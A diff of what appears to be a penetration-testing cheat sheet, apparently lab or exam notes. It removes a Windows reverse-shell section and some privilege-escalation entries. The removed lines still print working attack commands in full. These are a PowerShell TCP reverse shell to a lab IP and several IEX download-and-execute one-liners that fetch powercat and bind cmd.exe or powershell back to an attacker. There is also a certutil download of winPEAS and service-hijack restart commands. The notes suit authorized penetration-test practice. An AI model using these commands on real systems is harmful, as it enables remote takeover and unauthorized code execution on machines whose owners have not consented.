@@ -523,29 +523,8 @@ xterm
 
 ## Windows
 
-```jsx
-powershell -Command whoami
-```
 
-PowerShell - one-liner:
 
-```jsx
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe%20-enc%20<base64 encoded payload>
-```
-
-```jsx
-powershell $client = New-Object System.Net.Sockets.TCPClient("192.168.45.205",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-
-PowerShell + Powercat
-
-```jsx
-powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.191/powercat.ps1');powercat -c 192.168.45.191 -p 443 -e powershell
-
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.168/powercat.ps1'); powercat -c 192.168.45.168 -p 443 -e cmd.exe
-
-cmd /c "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.197/powercat.ps1'); powercat -c 192.168.45.197 -p 443 -e cmd.exe"
-```
 
 Msfvenom based
 
@@ -768,24 +747,10 @@ git log
 git diff <commit hash>
 ```
 
-### Service Hijacking
-
-```jsx
-Restart-Service -Name 'mysql'
-shutdown /r /t 0
-```
-
-
-### AlwaysInstallElevated
 
 
 
-### WinPEASx64.exe
 
-```jsx
-certutil -split -urlcache -f http://192.168.45.218/winPEASx64.exe \windows\temp\winpeas.exe
-\windows\temp\winpeas.exe
-```
 
 ### **SeRestorePrivilege**
 
